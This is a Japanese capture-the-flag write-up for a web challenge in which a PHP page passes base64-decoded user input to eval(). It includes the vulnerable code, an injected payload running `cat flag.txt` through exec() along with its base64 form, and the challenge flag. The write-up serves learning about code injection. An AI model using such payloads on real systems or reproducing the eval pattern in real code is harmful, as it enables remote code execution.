# Evil Eval
シーザー暗号の次は, base64をデコードするページを実装したらしい。  
とはいえ, この実装ってあまり良くないんじゃ......  

flag.txtが同じディレクトリにあるらしいから, それを読みだしてこの実装の危険性を教えてあげて。  

http://34.82.49.144:3337/  

## Attachment
 - [show.php](./show.php)

# 解法
show.phpを見ると, 下記の部分で文字列を入力していることがわかります。  

```
<?php
$result = "";
    if (isset($_GET['data'])) {
        $data = $_GET['data'];
        $raw = base64_decode($data);
        eval('$result = ' . $raw . ';');
    }
?>
```

ここでは, GETリクエストで`?data`パラメータに入った値をbase64でデコードして, `eval('$result = ' . $raw . ';')`を実行しています。  
そのため, base64でエンコードした値を`?data`パラメータに入れておけば, `eval('$result = {任意の文字列};')`を実行できることになります。  

[`eval`](https://www.php.net/manual/ja/function.eval.php)はその中の文字列をPHPコードとして評価します。そのため, `0; echo exec('cat flag.txt')`を入力できれば, `eval('$result = 0; echo exec('cat flag.txt')';)`を実行できます。  

この文字列をbase64でエンコードした`MDsgZWNobyBleGVjKCdjYXQgZmxhZy50eHQnKQ==`を入力すれば, フラグが得られます。  

# 別解
後から気づいたのですが, flag.txtのパーミッションに欠陥があり, http://34.82.49.144:3337/flag.txt にアクセスすると`flag.txt`が表示されます。  
しょうもないところでミスをしてしまい, 申し訳ありませんでした。  

# フラグ
`taskctf{eval_1s_b4d_h4bit}`  


